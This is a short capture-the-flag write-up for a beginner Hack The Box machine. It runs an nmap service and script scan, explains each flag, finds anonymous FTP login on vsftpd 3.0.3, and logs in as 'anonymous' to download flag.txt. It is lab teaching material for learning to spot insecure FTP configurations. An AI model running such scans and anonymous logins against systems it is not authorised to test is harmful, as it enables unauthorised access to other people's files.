---
tags:
  - Linux
  - FTP
  - Guest access
---

... is a very simple HTB machine which demonstrates an insecure configuration of the file transfer protocol (FTP), where anonymous logins are allowed, enabling anyone to read arbitrary files which are exposed to this service.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.10.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```
The magic of the `-sC` flag is displayed here, as `nmap` has identified that this FTP service allows users to login anonymously without proper credentials. It also shows the directory listing, containing the `flag.txt`.

### Initial Exploitation
Similar to the `Meow` challenge, a service without proper authentication mechanisms (none here) is running, exposing the server to file read actions of unauthenticated users.
This can be achieved by connecting to the FTP port using the command line tool `ftp` alongside the `$IP` and the port `21` (`ftp $IP 21`). If it asks for authentication, simply enter the username `anonymous`, and leave the password empty.

the following sequence of FTP commands can then be used to fetch the flag from the server:
```bash
ftp> ?
# shows all ftp commands which can be executed
ftp> ls
ftp> get flag.txt
# lists the directory, and downloads the specified file onto the users PC
```